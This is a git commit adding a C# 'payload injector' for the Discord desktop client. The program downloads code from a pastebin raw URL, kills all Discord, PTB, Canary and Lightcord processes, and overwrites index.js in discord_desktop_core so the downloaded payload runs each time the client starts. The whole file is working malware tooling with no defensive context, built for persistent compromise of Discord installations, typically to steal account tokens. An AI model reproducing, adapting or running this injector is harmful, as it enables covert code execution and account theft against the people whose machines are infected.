2eee680288a1dd80d78d9df3b2b7686fade903ee
Ѵιcнч"RCΛ#1337 <66045929+Its-Vichy@users.noreply.github.com>
2021-06-19 05:14:35 +0200

    🌙 - Bêta payload injector
    Adding Bêta version of payload injector, not optimized

---
+++ Injector/Injector/Program.cs
@@ -0,0 +1,73 @@
+﻿using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Net;
+using System.IO;
+using System;
+
+namespace Injector
+{
+    internal class Program
+    {
+        internal static string LocalDirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        internal static string RoamiDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
+        internal static List<string> DiscordPath = new List<string>
+        {
+            $"{LocalDirectory}\\discord\\",
+            $"{RoamiDirectory}\\Discord\\",
+            $"{RoamiDirectory}\\Lightcord\\",
+            $"{RoamiDirectory}\\discordptb\\",
+            $"{RoamiDirectory}\\discordcanary\\",
+        };
+
+        internal static List<string> ProcessToKill = new List<string>
+        {
+                "DiscordDevelopment",
+                "DiscordPTB",
+                "Lightcord",
+                "Discord",
+                "discord",
+        };
+
+        internal static void Main()
+        {
+            var Payload = new WebClient().DownloadString("https://pastebin.com/raw/xxxxx");
+
+            ProcessToKill.ForEach(proc =>
+            {
+                foreach (var process in Process.GetProcessesByName(proc))
+                {
+                    try
+                    {
+                        process.Kill();
+                    }
+                    catch { };
+                }
+            });
+
+            DiscordPath.ForEach(path =>
+            {
+                if (!Directory.Exists(path)) return;
+
+                Directory.GetDirectories(path).Where(dir => dir.Contains("app-")).ToList<string>().ForEach(dirs =>
+                {
+                    Directory.GetDirectories(dirs).Where(dir => dir.Contains("module")).ToList<string>().ForEach(module_dirs =>
+                    {
+                        Directory.GetDirectories(module_dirs).Where(dir => dir.Contains("discord_desktop_core")).ToList<string>().ForEach(core =>
+                        {
+                            Directory.GetFiles(core, "*.*", SearchOption.AllDirectories).Where(s => s.ToLower().EndsWith("index.js")).ToList<string>().ForEach(file =>
+                            {
+                                try
+                                {
+                                    File.WriteAllText(file, Payload);
+                                }
+                                catch { };
+                            });
+                        });
+                    });
+                });
+            });
+        }
+    }
+}
